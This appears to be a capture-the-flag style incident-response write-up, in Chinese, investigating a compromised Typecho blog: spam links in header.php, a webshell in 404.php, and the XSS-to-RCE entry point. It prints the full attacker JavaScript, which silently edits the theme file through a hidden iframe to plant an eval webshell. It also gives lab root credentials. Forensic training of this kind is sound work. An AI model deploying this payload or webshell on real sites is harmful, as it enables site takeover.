# 第五章-Linux实战-黑链

  
  
&lt;!--more--&gt;  
## 0x00 环境分析  
```  
服务器场景操作系统 Linux  
服务器账号密码 root xjty110pora 端口 2222  
```  
## 0x01  
1、找到黑链添加在哪个文件 flag 格式 flag{xxx.xxx}  
备份源码  
`tar -zcvf /tmp/web.tar.gz /var/www/html`  
搜索一下黑链  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010016491.png)
在`header.php`中  
`flag{header.php}`  
2、webshell的绝对路径 flag{xxxx/xxx/xxx/xxx/}  
放到 D 盾里扫描一下或者全局搜索一下`eval`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010018118.png)
发现在`404.php`中  
`flag{/var/www/html/usr/themes/default/404.php}`  
3、黑客注入黑链文件的 md5 md5sum file flag{md5}  
在`poc1.js`中发现了注入黑链的文件  
```javascript  
// 定义一个函数，在网页末尾插入一个iframe元素  
function insertIframe() {  
    // 获取当前页面路径  
    var urlWithoutDomain = window.location.pathname;  
    // 判断页面是否为评论管理页面  
    var hasManageComments = urlWithoutDomain.includes(&#34;manage-comments.php&#34;);  
    var tSrc=&#39;&#39;;  
    if (hasManageComments){  
        // 如果是，则将路径修改为用于修改主题文件的页面地址  
        tSrc=urlWithoutDomain.replace(&#39;manage-comments.php&#39;,&#39;theme-editor.php?theme=default&amp;file=404.php&#39;);  
    }else{  
        // 如果不是，则直接使用主题文件修改页面地址  
        tSrc=&#39;/admin/theme-editor.php?theme=default&amp;file=404.php&#39;;  
    }  
    // 定义iframe元素的属性，包括id、src、width、height和onload事件  
    var iframeAttributes = &#34;&lt;iframe id=&#39;theme_id&#39; src=&#39;&#34;&#43;tSrc&#43;&#34;&#39; width=&#39;0%&#39; height=&#39;0%&#39; onload=&#39;writeShell()&#39;&gt;&lt;/iframe&gt;&#34;;  
    // 获取网页原始内容  
    var originalContent = document.body.innerHTML;  
    // 在网页末尾添加iframe元素  
    document.body.innerHTML = (originalContent &#43; iframeAttributes);  
}  
  
// 定义一个全局变量isSaved，初始值为false  
var isSaved = false;  
  
// 定义一个函数，在iframe中写入一段PHP代码并保存  
function writeShell() {  
    // 如果isSaved为false  
    if (!isSaved) {   
        // 获取iframe内的内容区域和“保存文件”按钮元素  
        var content = document.getElementById(&#39;theme_id&#39;).contentWindow.document.getElementById(&#39;content&#39;);  
        var btns = document.getElementById(&#39;theme_id&#39;).contentWindow.document.getElementsByTagName(&#39;button&#39;);      
        // 获取模板文件原始内容  
        var oldData = content.value;  
        // 在原始内容前加入一段phpinfo代码  
        content.value = (&#39;&lt;?php @eval($_POST[a]); ?&gt;\n&#39;) &#43; oldData;  
        // 点击“保存文件”按钮  
        btns[1].click();  
        // 将isSaved设为true，表示已经完成写入操作  
        isSaved = true;  
    }  
}  
// 调用insertIframe函数，向网页中添加iframe元素和写入PHP代码的事件  
insertIframe();  
```  
`flag{10c18029294fdec7b6ddab76d9367c14}`  
4、攻击入口是哪里？url请求路径，最后面加/ flag{/xxxx.xxx/xxxx/x/}  
在源码中存在`output.pcag`，利用`wireshark`分析一下  
通过源码得知是`Typecho`，百度搜索得知存在`RCE`漏洞  
https://blog.mo60.cn/index.php/archives/Typecho-1-2-xss2rce.html  
通过流量包查看，正是此漏洞  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010041181.png)
触发点是`/index.php/archives/1/`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010043306.png)
`flag{/index.php/archives/1/}`  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E9%BB%91%E9%93%BE/  

